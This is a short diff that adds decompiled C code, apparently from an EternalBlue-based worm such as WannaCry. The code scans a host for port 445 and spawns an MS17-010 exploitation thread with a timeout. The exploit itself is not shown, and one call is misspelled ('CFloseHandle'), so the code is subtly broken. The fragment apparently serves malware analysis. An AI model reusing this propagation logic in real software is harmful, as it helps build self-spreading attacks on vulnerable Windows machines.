@@ -1,0 +1,19 @@
+int _cdecl scan_IP(int a1)
+{
+void *v1; // eax@2
+void *v2; // esi@2
+if ( can_connect_to_port_445(a1) > 0 )
+{
+v1 = (void *)beginthreadex(0, 0, MS17_010_attempt_pwn_thread, a1, 0, 0);
+v2 = v1;
+if ( v1 )
+{
+if ( WaitForSingleObject(v1, 600000u) == WAIT_TIMEOUT )
+TerminateThread(v2, 0);
+CFloseHandle(v2);
+}
+}
+InterlockedDecrement((volatile LONG *)&FileName[268]);
+endthreadex(0);
+return 0;
+}
